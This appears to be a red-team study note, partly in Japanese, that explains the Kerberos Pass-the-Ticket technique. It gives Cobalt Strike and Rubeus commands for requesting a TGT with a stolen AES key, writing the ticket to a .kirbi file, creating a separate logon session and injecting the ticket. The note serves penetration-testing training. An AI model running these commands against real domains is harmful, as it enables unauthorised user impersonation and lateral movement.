_Pass the Ticket_ (or PtT), is a technique that allows an adversary to leverage stolen, forged, or requested Kerberos tickets for user impersonation.

Kerberos authentication is not anomalous, nor is it restricted as with NTLM; and passing tickets into a logon session can be done with native Windows APIs, so it does not rely on patching LSASS memory.

## Requesting TGTs
the adversary can also legitimately request Kerberos tickets on behalf of a user if they have their NTLM hash or AES encryption keys.

`asktgt` command can be used with a user's AES key.
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960 /nowrap
```

## Injecting TGTs
`kerberos_ticket_use` comand, which imports the provided ticket into the current session. The ticket must exist as a .kirbi file on the computer running the Cobalt Strike client.

If you have a base64 encoded ticket from Rubeus, you can write it to disk using PowerShell.
```powershell
$ticket = "doIFo[...snip...]kNPTQ=="
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String($ticket))
```

### ログオンセッションを分ける
影響を与えたくないとき
偽のパスワード指定してログオンセッションを作成
```
make_token CONTOSO\rsteel FakePass
```

チケットの利用
```
kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
```

チケットの確認
```
run klist
```


## Rubeus way
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /username:rsteel /domain:CONTOSO.COM /password:FakePass
```

